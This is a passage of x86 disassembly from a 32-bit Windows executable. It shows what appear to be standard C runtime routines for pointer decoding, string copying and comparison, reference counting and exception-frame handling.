  40686b:	8b 07                	mov    (%edi),%eax
  40686d:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  406870:	74 f2                	je     0x406864
  406872:	33 c2                	xor    %edx,%eax
  406874:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406877:	d3 c8                	ror    %cl,%eax
  406879:	8b c8                	mov    %eax,%ecx
  40687b:	89 17                	mov    %edx,(%edi)
  40687d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406880:	ff 15 24 f2 40 00    	call   *0x40f224
  406886:	ff 55 f0             	call   *-0x10(%ebp)
  406889:	8b 03                	mov    (%ebx),%eax
  40688b:	8b 15 04 60 41 00    	mov    0x416004,%edx
  406891:	8b ca                	mov    %edx,%ecx
  406893:	83 e1 1f             	and    $0x1f,%ecx
  406896:	8b 00                	mov    (%eax),%eax
  406898:	8b 18                	mov    (%eax),%ebx
  40689a:	8b 40 04             	mov    0x4(%eax),%eax
  40689d:	33 da                	xor    %edx,%ebx
  40689f:	d3 cb                	ror    %cl,%ebx
  4068a1:	33 c2                	xor    %edx,%eax
  4068a3:	d3 c8                	ror    %cl,%eax
  4068a5:	3b 5d f8             	cmp    -0x8(%ebp),%ebx
  4068a8:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4068ab:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  4068ae:	75 05                	jne    0x4068b5
  4068b0:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  4068b3:	74 af                	je     0x406864
  4068b5:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4068b8:	8b f8                	mov    %eax,%edi
  4068ba:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4068bd:	eb a2                	jmp    0x406861
  4068bf:	83 fe ff             	cmp    $0xffffffff,%esi
  4068c2:	74 0d                	je     0x4068d1
  4068c4:	56                   	push   %esi
  4068c5:	e8 fd 11 00 00       	call   0x407ac7
  4068ca:	8b 15 04 60 41 00    	mov    0x416004,%edx
  4068d0:	59                   	pop    %ecx
  4068d1:	8b 03                	mov    (%ebx),%eax
  4068d3:	8b 00                	mov    (%eax),%eax
  4068d5:	89 10                	mov    %edx,(%eax)
  4068d7:	8b 03                	mov    (%ebx),%eax
  4068d9:	8b 00                	mov    (%eax),%eax
  4068db:	89 50 04             	mov    %edx,0x4(%eax)
  4068de:	8b 03                	mov    (%ebx),%eax
  4068e0:	8b 00                	mov    (%eax),%eax
  4068e2:	89 50 08             	mov    %edx,0x8(%eax)
  4068e5:	33 c0                	xor    %eax,%eax
  4068e7:	5e                   	pop    %esi
  4068e8:	5f                   	pop    %edi
  4068e9:	5b                   	pop    %ebx
  4068ea:	c9                   	leave
  4068eb:	c3                   	ret
  4068ec:	8b ff                	mov    %edi,%edi
  4068ee:	55                   	push   %ebp
  4068ef:	8b ec                	mov    %esp,%ebp
  4068f1:	ff 75 08             	push   0x8(%ebp)
  4068f4:	68 44 6e 41 00       	push   $0x416e44
  4068f9:	e8 5a 00 00 00       	call   0x406958
  4068fe:	59                   	pop    %ecx
  4068ff:	59                   	pop    %ecx
  406900:	5d                   	pop    %ebp
  406901:	c3                   	ret
  406902:	8b ff                	mov    %edi,%edi
  406904:	55                   	push   %ebp
  406905:	8b ec                	mov    %esp,%ebp
  406907:	83 ec 10             	sub    $0x10,%esp
  40690a:	6a 02                	push   $0x2
  40690c:	8d 45 08             	lea    0x8(%ebp),%eax
  40690f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406912:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406915:	58                   	pop    %eax
  406916:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406919:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40691c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40691f:	50                   	push   %eax
  406920:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406923:	50                   	push   %eax
  406924:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406927:	50                   	push   %eax
  406928:	e8 06 fd ff ff       	call   0x406633
  40692d:	c9                   	leave
  40692e:	c3                   	ret
  40692f:	8b ff                	mov    %edi,%edi
  406931:	55                   	push   %ebp
  406932:	8b ec                	mov    %esp,%ebp
  406934:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406937:	85 c9                	test   %ecx,%ecx
  406939:	75 05                	jne    0x406940
  40693b:	83 c8 ff             	or     $0xffffffff,%eax
  40693e:	5d                   	pop    %ebp
  40693f:	c3                   	ret
  406940:	8b 01                	mov    (%ecx),%eax
  406942:	3b 41 08             	cmp    0x8(%ecx),%eax
  406945:	75 0d                	jne    0x406954
  406947:	a1 04 60 41 00       	mov    0x416004,%eax
  40694c:	89 01                	mov    %eax,(%ecx)
  40694e:	89 41 04             	mov    %eax,0x4(%ecx)
  406951:	89 41 08             	mov    %eax,0x8(%ecx)
  406954:	33 c0                	xor    %eax,%eax
  406956:	5d                   	pop    %ebp
  406957:	c3                   	ret
  406958:	8b ff                	mov    %edi,%edi
  40695a:	55                   	push   %ebp
  40695b:	8b ec                	mov    %esp,%ebp
  40695d:	83 ec 14             	sub    $0x14,%esp
  406960:	8d 45 08             	lea    0x8(%ebp),%eax
  406963:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406966:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406969:	6a 02                	push   $0x2
  40696b:	8d 45 0c             	lea    0xc(%ebp),%eax
  40696e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406971:	58                   	pop    %eax
  406972:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406975:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406978:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40697b:	50                   	push   %eax
  40697c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40697f:	50                   	push   %eax
  406980:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406983:	50                   	push   %eax
  406984:	e8 05 fd ff ff       	call   0x40668e
  406989:	c9                   	leave
  40698a:	c3                   	ret
  40698b:	c7 05 38 6f 41 00 60 	movl   $0x416060,0x416f38
  406992:	60 41 00 
  406995:	b0 01                	mov    $0x1,%al
  406997:	c3                   	ret
  406998:	68 44 6e 41 00       	push   $0x416e44
  40699d:	e8 8d ff ff ff       	call   0x40692f
  4069a2:	c7 04 24 50 6e 41 00 	movl   $0x416e50,(%esp)
  4069a9:	e8 81 ff ff ff       	call   0x40692f
  4069ae:	59                   	pop    %ecx
  4069af:	b0 01                	mov    $0x1,%al
  4069b1:	c3                   	ret
  4069b2:	e8 cd f6 ff ff       	call   0x406084
  4069b7:	b0 01                	mov    $0x1,%al
  4069b9:	c3                   	ret
  4069ba:	8b ff                	mov    %edi,%edi
  4069bc:	56                   	push   %esi
  4069bd:	8b 35 04 60 41 00    	mov    0x416004,%esi
  4069c3:	56                   	push   %esi
  4069c4:	e8 c2 09 00 00       	call   0x40738b
  4069c9:	56                   	push   %esi
  4069ca:	e8 63 ef ff ff       	call   0x405932
  4069cf:	56                   	push   %esi
  4069d0:	e8 83 33 00 00       	call   0x409d58
  4069d5:	56                   	push   %esi
  4069d6:	e8 9e f1 ff ff       	call   0x405b79
  4069db:	56                   	push   %esi
  4069dc:	e8 1b fa ff ff       	call   0x4063fc
  4069e1:	83 c4 14             	add    $0x14,%esp
  4069e4:	b0 01                	mov    $0x1,%al
  4069e6:	5e                   	pop    %esi
  4069e7:	c3                   	ret
  4069e8:	6a 00                	push   $0x0
  4069ea:	e8 6c df ff ff       	call   0x40495b
  4069ef:	59                   	pop    %ecx
  4069f0:	c3                   	ret
  4069f1:	8b ff                	mov    %edi,%edi
  4069f3:	55                   	push   %ebp
  4069f4:	8b ec                	mov    %esp,%ebp
  4069f6:	51                   	push   %ecx
  4069f7:	68 9c 70 41 00       	push   $0x41709c
  4069fc:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  4069ff:	e8 54 00 00 00       	call   0x406a58
  406a04:	b0 01                	mov    $0x1,%al
  406a06:	c9                   	leave
  406a07:	c3                   	ret
  406a08:	8b ff                	mov    %edi,%edi
  406a0a:	56                   	push   %esi
  406a0b:	ff 35 f0 72 41 00    	push   0x4172f0
  406a11:	e8 b1 10 00 00       	call   0x407ac7
  406a16:	ff 35 f4 72 41 00    	push   0x4172f4
  406a1c:	33 f6                	xor    %esi,%esi
  406a1e:	89 35 f0 72 41 00    	mov    %esi,0x4172f0
  406a24:	e8 9e 10 00 00       	call   0x407ac7
  406a29:	ff 35 b0 70 41 00    	push   0x4170b0
  406a2f:	89 35 f4 72 41 00    	mov    %esi,0x4172f4
  406a35:	e8 8d 10 00 00       	call   0x407ac7
  406a3a:	ff 35 b4 70 41 00    	push   0x4170b4
  406a40:	89 35 b0 70 41 00    	mov    %esi,0x4170b0
  406a46:	e8 7c 10 00 00       	call   0x407ac7
  406a4b:	83 c4 10             	add    $0x10,%esp
  406a4e:	89 35 b4 70 41 00    	mov    %esi,0x4170b4
  406a54:	b0 01                	mov    $0x1,%al
  406a56:	5e                   	pop    %esi
  406a57:	c3                   	ret
  406a58:	8b ff                	mov    %edi,%edi
  406a5a:	55                   	push   %ebp
  406a5b:	8b ec                	mov    %esp,%ebp
  406a5d:	56                   	push   %esi
  406a5e:	8b 75 08             	mov    0x8(%ebp),%esi
  406a61:	83 c9 ff             	or     $0xffffffff,%ecx
  406a64:	8b 06                	mov    (%esi),%eax
  406a66:	f0 0f c1 08          	lock xadd %ecx,(%eax)
  406a6a:	75 15                	jne    0x406a81
  406a6c:	57                   	push   %edi
  406a6d:	bf 28 61 41 00       	mov    $0x416128,%edi
  406a72:	39 3e                	cmp    %edi,(%esi)
  406a74:	74 0a                	je     0x406a80
  406a76:	ff 36                	push   (%esi)
  406a78:	e8 4a 10 00 00       	call   0x407ac7
  406a7d:	59                   	pop    %ecx
  406a7e:	89 3e                	mov    %edi,(%esi)
  406a80:	5f                   	pop    %edi
  406a81:	5e                   	pop    %esi
  406a82:	5d                   	pop    %ebp
  406a83:	c2 04 00             	ret    $0x4
  406a86:	68 10 ff 40 00       	push   $0x40ff10
  406a8b:	68 90 fe 40 00       	push   $0x40fe90
  406a90:	e8 35 31 00 00       	call   0x409bca
  406a95:	59                   	pop    %ecx
  406a96:	59                   	pop    %ecx
  406a97:	c3                   	ret
  406a98:	8b ff                	mov    %edi,%edi
  406a9a:	55                   	push   %ebp
  406a9b:	8b ec                	mov    %esp,%ebp
  406a9d:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  406aa1:	74 12                	je     0x406ab5
  406aa3:	83 3d ec 72 41 00 00 	cmpl   $0x0,0x4172ec
  406aaa:	74 05                	je     0x406ab1
  406aac:	e8 42 37 00 00       	call   0x40a1f3
  406ab1:	b0 01                	mov    $0x1,%al
  406ab3:	5d                   	pop    %ebp
  406ab4:	c3                   	ret
  406ab5:	68 10 ff 40 00       	push   $0x40ff10
  406aba:	68 90 fe 40 00       	push   $0x40fe90
  406abf:	e8 6e 31 00 00       	call   0x409c32
  406ac4:	59                   	pop    %ecx
  406ac5:	59                   	pop    %ecx
  406ac6:	5d                   	pop    %ebp
  406ac7:	c3                   	ret
  406ac8:	8b ff                	mov    %edi,%edi
  406aca:	55                   	push   %ebp
  406acb:	8b ec                	mov    %esp,%ebp
  406acd:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406ad0:	8b 45 0c             	mov    0xc(%ebp),%eax
  406ad3:	81 e1 ff ff f7 ff    	and    $0xfff7ffff,%ecx
  406ad9:	23 c1                	and    %ecx,%eax
  406adb:	56                   	push   %esi
  406adc:	8b 75 08             	mov    0x8(%ebp),%esi
  406adf:	a9 e0 fc f0 fc       	test   $0xfcf0fce0,%eax
  406ae4:	74 24                	je     0x406b0a
  406ae6:	85 f6                	test   %esi,%esi
  406ae8:	74 0d                	je     0x406af7
  406aea:	6a 00                	push   $0x0
  406aec:	6a 00                	push   $0x0
  406aee:	e8 ec 38 00 00       	call   0x40a3df
  406af3:	59                   	pop    %ecx
  406af4:	59                   	pop    %ecx
  406af5:	89 06                	mov    %eax,(%esi)
  406af7:	e8 bf 09 00 00       	call   0x4074bb
  406afc:	6a 16                	push   $0x16
  406afe:	5e                   	pop    %esi
  406aff:	89 30                	mov    %esi,(%eax)
  406b01:	e8 f8 08 00 00       	call   0x4073fe
  406b06:	8b c6                	mov    %esi,%eax
  406b08:	eb 1a                	jmp    0x406b24
  406b0a:	51                   	push   %ecx
  406b0b:	ff 75 0c             	push   0xc(%ebp)
  406b0e:	85 f6                	test   %esi,%esi
  406b10:	74 09                	je     0x406b1b
  406b12:	e8 c8 38 00 00       	call   0x40a3df
  406b17:	89 06                	mov    %eax,(%esi)
  406b19:	eb 05                	jmp    0x406b20
  406b1b:	e8 bf 38 00 00       	call   0x40a3df
  406b20:	59                   	pop    %ecx
  406b21:	59                   	pop    %ecx
  406b22:	33 c0                	xor    %eax,%eax
  406b24:	5e                   	pop    %esi
  406b25:	5d                   	pop    %ebp
  406b26:	c3                   	ret
  406b27:	6a 08                	push   $0x8
  406b29:	68 78 49 41 00       	push   $0x414978
  406b2e:	e8 bd d6 ff ff       	call   0x4041f0
  406b33:	e8 c8 04 00 00       	call   0x407000
  406b38:	8b 70 0c             	mov    0xc(%eax),%esi
  406b3b:	85 f6                	test   %esi,%esi
  406b3d:	74 1e                	je     0x406b5d
  406b3f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406b43:	8b ce                	mov    %esi,%ecx
  406b45:	ff 15 24 f2 40 00    	call   *0x40f224
  406b4b:	ff d6                	call   *%esi
  406b4d:	eb 07                	jmp    0x406b56
  406b4f:	33 c0                	xor    %eax,%eax
  406b51:	40                   	inc    %eax
  406b52:	c3                   	ret
  406b53:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406b56:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406b5d:	e8 5b 00 00 00       	call   0x406bbd
  406b62:	cc                   	int3
  406b63:	8b ff                	mov    %edi,%edi
  406b65:	55                   	push   %ebp
  406b66:	8b ec                	mov    %esp,%ebp
  406b68:	8b 55 08             	mov    0x8(%ebp),%edx
  406b6b:	56                   	push   %esi
  406b6c:	85 d2                	test   %edx,%edx
  406b6e:	74 11                	je     0x406b81
  406b70:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406b73:	85 c9                	test   %ecx,%ecx
  406b75:	74 0a                	je     0x406b81
  406b77:	8b 75 10             	mov    0x10(%ebp),%esi
  406b7a:	85 f6                	test   %esi,%esi
  406b7c:	75 17                	jne    0x406b95
  406b7e:	c6 02 00             	movb   $0x0,(%edx)
  406b81:	e8 35 09 00 00       	call   0x4074bb
  406b86:	6a 16                	push   $0x16
  406b88:	5e                   	pop    %esi
  406b89:	89 30                	mov    %esi,(%eax)
  406b8b:	e8 6e 08 00 00       	call   0x4073fe
  406b90:	8b c6                	mov    %esi,%eax
  406b92:	5e                   	pop    %esi
  406b93:	5d                   	pop    %ebp
  406b94:	c3                   	ret
  406b95:	57                   	push   %edi
  406b96:	8b fa                	mov    %edx,%edi
  406b98:	2b f2                	sub    %edx,%esi
  406b9a:	8a 04 3e             	mov    (%esi,%edi,1),%al
  406b9d:	88 07                	mov    %al,(%edi)
  406b9f:	47                   	inc    %edi
  406ba0:	84 c0                	test   %al,%al
  406ba2:	74 05                	je     0x406ba9
  406ba4:	83 e9 01             	sub    $0x1,%ecx
  406ba7:	75 f1                	jne    0x406b9a
  406ba9:	5f                   	pop    %edi
  406baa:	85 c9                	test   %ecx,%ecx
  406bac:	75 0b                	jne    0x406bb9
  406bae:	88 0a                	mov    %cl,(%edx)
  406bb0:	e8 06 09 00 00       	call   0x4074bb
  406bb5:	6a 22                	push   $0x22
  406bb7:	eb cf                	jmp    0x406b88
  406bb9:	33 f6                	xor    %esi,%esi
  406bbb:	eb d3                	jmp    0x406b90
  406bbd:	e8 6f 31 00 00       	call   0x409d31
  406bc2:	85 c0                	test   %eax,%eax
  406bc4:	74 08                	je     0x406bce
  406bc6:	6a 16                	push   $0x16
  406bc8:	e8 a9 31 00 00       	call   0x409d76
  406bcd:	59                   	pop    %ecx
  406bce:	f6 05 40 60 41 00 02 	testb  $0x2,0x416040
  406bd5:	74 22                	je     0x406bf9
  406bd7:	6a 17                	push   $0x17
  406bd9:	ff 15 58 f1 40 00    	call   *0x40f158
  406bdf:	85 c0                	test   %eax,%eax
  406be1:	74 05                	je     0x406be8
  406be3:	6a 07                	push   $0x7
  406be5:	59                   	pop    %ecx
  406be6:	cd 29                	int    $0x29
  406be8:	6a 01                	push   $0x1
  406bea:	68 15 00 00 40       	push   $0x40000015
  406bef:	6a 03                	push   $0x3
  406bf1:	e8 5c 06 00 00       	call   0x407252
  406bf6:	83 c4 0c             	add    $0xc,%esp
  406bf9:	6a 03                	push   $0x3
  406bfb:	e8 29 f8 ff ff       	call   0x406429
  406c00:	cc                   	int3
  406c01:	8b ff                	mov    %edi,%edi
  406c03:	55                   	push   %ebp
  406c04:	8b ec                	mov    %esp,%ebp
  406c06:	5d                   	pop    %ebp
  406c07:	e9 5e 0e 00 00       	jmp    0x407a6a
  406c0c:	cc                   	int3
  406c0d:	cc                   	int3
  406c0e:	cc                   	int3
  406c0f:	cc                   	int3
  406c10:	53                   	push   %ebx
  406c11:	56                   	push   %esi
  406c12:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406c16:	8b 54 24 10          	mov    0x10(%esp),%edx
  406c1a:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  406c1e:	f7 c3 ff ff ff ff    	test   $0xffffffff,%ebx
  406c24:	74 50                	je     0x406c76
  406c26:	2b ca                	sub    %edx,%ecx
  406c28:	f7 c2 03 00 00 00    	test   $0x3,%edx
  406c2e:	74 17                	je     0x406c47
  406c30:	0f b6 04 11          	movzbl (%ecx,%edx,1),%eax
  406c34:	3a 02                	cmp    (%edx),%al
  406c36:	75 48                	jne    0x406c80
  406c38:	85 c0                	test   %eax,%eax
  406c3a:	74 3a                	je     0x406c76
  406c3c:	42                   	inc    %edx
  406c3d:	83 eb 01             	sub    $0x1,%ebx
  406c40:	76 34                	jbe    0x406c76
  406c42:	f6 c2 03             	test   $0x3,%dl
  406c45:	75 e9                	jne    0x406c30
  406c47:	8d 04 11             	lea    (%ecx,%edx,1),%eax
  406c4a:	25 ff 0f 00 00       	and    $0xfff,%eax
  406c4f:	3d fc 0f 00 00       	cmp    $0xffc,%eax
  406c54:	77 da                	ja     0x406c30
  406c56:	8b 04 11             	mov    (%ecx,%edx,1),%eax
  406c59:	3b 02                	cmp    (%edx),%eax
  406c5b:	75 d3                	jne    0x406c30
  406c5d:	83 eb 04             	sub    $0x4,%ebx
  406c60:	76 14                	jbe    0x406c76
  406c62:	8d b0 ff fe fe fe    	lea    -0x1010101(%eax),%esi
  406c68:	83 c2 04             	add    $0x4,%edx
  406c6b:	f7 d0                	not    %eax
  406c6d:	23 c6                	and    %esi,%eax
  406c6f:	a9 80 80 80 80       	test   $0x80808080,%eax
  406c74:	74 d1                	je     0x406c47
  406c76:	33 c0                	xor    %eax,%eax
  406c78:	5e                   	pop    %esi
  406c79:	5b                   	pop    %ebx
  406c7a:	c3                   	ret
  406c7b:	eb 03                	jmp    0x406c80
  406c7d:	cc                   	int3
  406c7e:	cc                   	int3
  406c7f:	cc                   	int3
  406c80:	1b c0                	sbb    %eax,%eax
  406c82:	83 c8 01             	or     $0x1,%eax
  406c85:	5e                   	pop    %esi
  406c86:	5b                   	pop    %ebx
  406c87:	c3                   	ret
  406c88:	8b ff                	mov    %edi,%edi
  406c8a:	55                   	push   %ebp
  406c8b:	8b ec                	mov    %esp,%ebp
  406c8d:	8b 45 10             	mov    0x10(%ebp),%eax
  406c90:	85 c0                	test   %eax,%eax
  406c92:	75 02                	jne    0x406c96
  406c94:	5d                   	pop    %ebp
  406c95:	c3                   	ret
  406c96:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406c99:	8b 55 08             	mov    0x8(%ebp),%edx
  406c9c:	56                   	push   %esi
  406c9d:	83 e8 01             	sub    $0x1,%eax
  406ca0:	74 15                	je     0x406cb7
  406ca2:	0f b7 32             	movzwl (%edx),%esi
  406ca5:	66 85 f6             	test   %si,%si
  406ca8:	74 0d                	je     0x406cb7
  406caa:	66 3b 31             	cmp    (%ecx),%si
  406cad:	75 08                	jne    0x406cb7
  406caf:	83 c2 02             	add    $0x2,%edx
  406cb2:	83 c1 02             	add    $0x2,%ecx
  406cb5:	eb e6                	jmp    0x406c9d
  406cb7:	0f b7 02             	movzwl (%edx),%eax
  406cba:	0f b7 09             	movzwl (%ecx),%ecx
  406cbd:	2b c1                	sub    %ecx,%eax
  406cbf:	5e                   	pop    %esi
  406cc0:	5d                   	pop    %ebp
  406cc1:	c3                   	ret
  406cc2:	6a 08                	push   $0x8
  406cc4:	68 98 49 41 00       	push   $0x414998
  406cc9:	e8 22 d5 ff ff       	call   0x4041f0
  406cce:	8b 45 08             	mov    0x8(%ebp),%eax
  406cd1:	ff 30                	push   (%eax)
  406cd3:	e8 e5 0c 00 00       	call   0x4079bd
  406cd8:	59                   	pop    %ecx
  406cd9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406cdd:	8b 45 0c             	mov    0xc(%ebp),%eax
  406ce0:	8b 00                	mov    (%eax),%eax
  406ce2:	8b 00                	mov    (%eax),%eax
  406ce4:	8b 40 48             	mov    0x48(%eax),%eax
  406ce7:	f0 ff 00             	lock incl (%eax)
  406cea:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406cf1:	e8 12 00 00 00       	call   0x406d08
  406cf6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406cf9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406d00:	59                   	pop    %ecx
  406d01:	5f                   	pop    %edi
  406d02:	5e                   	pop    %esi
  406d03:	5b                   	pop    %ebx
  406d04:	c9                   	leave
  406d05:	c2 0c 00             	ret    $0xc
  406d08:	8b 45 10             	mov    0x10(%ebp),%eax
  406d0b:	ff 30                	push   (%eax)
  406d0d:	e8 f3 0c 00 00       	call   0x407a05
  406d12:	59                   	pop    %ecx
  406d13:	c3                   	ret
  406d14:	6a 08                	push   $0x8
  406d16:	68 d8 49 41 00       	push   $0x4149d8
  406d1b:	e8 d0 d4 ff ff       	call   0x4041f0
  406d20:	8b 45 08             	mov    0x8(%ebp),%eax
  406d23:	ff 30                	push   (%eax)
  406d25:	e8 93 0c 00 00       	call   0x4079bd
  406d2a:	59                   	pop    %ecx
  406d2b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406d2f:	8b 45 0c             	mov    0xc(%ebp),%eax
  406d32:	8b 00                	mov    (%eax),%eax
  406d34:	8b 00                	mov    (%eax),%eax
  406d36:	8b 48 48             	mov    0x48(%eax),%ecx
  406d39:	85 c9                	test   %ecx,%ecx
  406d3b:	74 18                	je     0x406d55
  406d3d:	83 c8 ff             	or     $0xffffffff,%eax
  406d40:	f0 0f c1 01          	lock xadd %eax,(%ecx)
  406d44:	75 0f                	jne    0x406d55
  406d46:	81 f9 28 61 41 00    	cmp    $0x416128,%ecx
  406d4c:	74 07                	je     0x406d55
  406d4e:	51                   	push   %ecx
  406d4f:	e8 73 0d 00 00       	call   0x407ac7
  406d54:	59                   	pop    %ecx
  406d55:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406d5c:	e8 12 00 00 00       	call   0x406d73
  406d61:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d64:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406d6b:	59                   	pop    %ecx
  406d6c:	5f                   	pop    %edi
  406d6d:	5e                   	pop    %esi
  406d6e:	5b                   	pop    %ebx
  406d6f:	c9                   	leave
  406d70:	c2 0c 00             	ret    $0xc
  406d73:	8b 45 10             	mov    0x10(%ebp),%eax
  406d76:	ff 30                	push   (%eax)
  406d78:	e8 88 0c 00 00       	call   0x407a05
  406d7d:	59                   	pop    %ecx
  406d7e:	c3                   	ret
  406d7f:	6a 08                	push   $0x8
  406d81:	68 f8 49 41 00       	push   $0x4149f8
  406d86:	e8 65 d4 ff ff       	call   0x4041f0
  406d8b:	8b 45 08             	mov    0x8(%ebp),%eax
  406d8e:	ff 30                	push   (%eax)
  406d90:	e8 28 0c 00 00       	call   0x4079bd
  406d95:	59                   	pop    %ecx
  406d96:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406d9a:	6a 00                	push   $0x0
  406d9c:	8b 45 0c             	mov    0xc(%ebp),%eax
  406d9f:	8b 00                	mov    (%eax),%eax
  406da1:	ff 30                	push   (%eax)
  406da3:	e8 0d 02 00 00       	call   0x406fb5
  406da8:	59                   	pop    %ecx
  406da9:	59                   	pop    %ecx
  406daa:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406db1:	e8 12 00 00 00       	call   0x406dc8
  406db6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406db9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406dc0:	59                   	pop    %ecx
  406dc1:	5f                   	pop    %edi
  406dc2:	5e                   	pop    %esi
  406dc3:	5b                   	pop    %ebx
  406dc4:	c9                   	leave
  406dc5:	c2 0c 00             	ret    $0xc
  406dc8:	8b 45 10             	mov    0x10(%ebp),%eax
  406dcb:	ff 30                	push   (%eax)
  406dcd:	e8 33 0c 00 00       	call   0x407a05
  406dd2:	59                   	pop    %ecx
  406dd3:	c3                   	ret
  406dd4:	6a 08                	push   $0x8
  406dd6:	68 b8 49 41 00       	push   $0x4149b8
  406ddb:	e8 10 d4 ff ff       	call   0x4041f0
  406de0:	8b 45 08             	mov    0x8(%ebp),%eax
  406de3:	ff 30                	push   (%eax)
  406de5:	e8 d3 0b 00 00       	call   0x4079bd
  406dea:	59                   	pop    %ecx
  406deb:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406def:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406df2:	8b 41 04             	mov    0x4(%ecx),%eax
  406df5:	8b 00                	mov    (%eax),%eax
  406df7:	ff 30                	push   (%eax)
  406df9:	8b 01                	mov    (%ecx),%eax
  406dfb:	ff 30                	push   (%eax)
  406dfd:	e8 b3 01 00 00       	call   0x406fb5
  406e02:	59                   	pop    %ecx
  406e03:	59                   	pop    %ecx
  406e04:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406e0b:	e8 12 00 00 00       	call   0x406e22
  406e10:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e13:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406e1a:	59                   	pop    %ecx
  406e1b:	5f                   	pop    %edi
  406e1c:	5e                   	pop    %esi
  406e1d:	5b                   	pop    %ebx
  406e1e:	c9                   	leave
  406e1f:	c2 0c 00             	ret    $0xc
  406e22:	8b 45 10             	mov    0x10(%ebp),%eax
  406e25:	ff 30                	push   (%eax)
  406e27:	e8 d9 0b 00 00       	call   0x407a05
  406e2c:	59                   	pop    %ecx
  406e2d:	c3                   	ret
  406e2e:	8b ff                	mov    %edi,%edi
  406e30:	55                   	push   %ebp
  406e31:	8b ec                	mov    %esp,%ebp
  406e33:	83 ec 14             	sub    $0x14,%esp
  406e36:	8b 45 08             	mov    0x8(%ebp),%eax
  406e39:	33 c9                	xor    %ecx,%ecx
  406e3b:	41                   	inc    %ecx
  406e3c:	6a 43                	push   $0x43
  406e3e:	89 48 18             	mov    %ecx,0x18(%eax)
  406e41:	8b 45 08             	mov    0x8(%ebp),%eax
  406e44:	c7 00 c8 fd 40 00    	movl   $0x40fdc8,(%eax)
  406e4a:	8b 45 08             	mov    0x8(%ebp),%eax
  406e4d:	89 88 50 03 00 00    	mov    %ecx,0x350(%eax)
  406e53:	8b 45 08             	mov    0x8(%ebp),%eax
  406e56:	59                   	pop    %ecx
  406e57:	6a 05                	push   $0x5
  406e59:	c7 40 48 28 61 41 00 	movl   $0x416128,0x48(%eax)
  406e60:	8b 45 08             	mov    0x8(%ebp),%eax
  406e63:	66 89 48 6c          	mov    %cx,0x6c(%eax)
  406e67:	8b 45 08             	mov    0x8(%ebp),%eax
  406e6a:	66 89 88 72 01 00 00 	mov    %cx,0x172(%eax)
  406e71:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406e74:	8b 45 08             	mov    0x8(%ebp),%eax
  406e77:	83 a0 4c 03 00 00 00 	andl   $0x0,0x34c(%eax)
  406e7e:	8d 45 08             	lea    0x8(%ebp),%eax
  406e81:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406e84:	58                   	pop    %eax
  406e85:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406e88:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406e8b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406e8e:	50                   	push   %eax
  406e8f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406e92:	50                   	push   %eax
  406e93:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406e96:	50                   	push   %eax
  406e97:	e8 26 fe ff ff       	call   0x406cc2
  406e9c:	8d 45 08             	lea    0x8(%ebp),%eax
  406e9f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406ea2:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406ea5:	6a 04                	push   $0x4
  406ea7:	8d 45 0c             	lea    0xc(%ebp),%eax
  406eaa:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406ead:	58                   	pop    %eax
  406eae:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406eb1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406eb4:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406eb7:	50                   	push   %eax
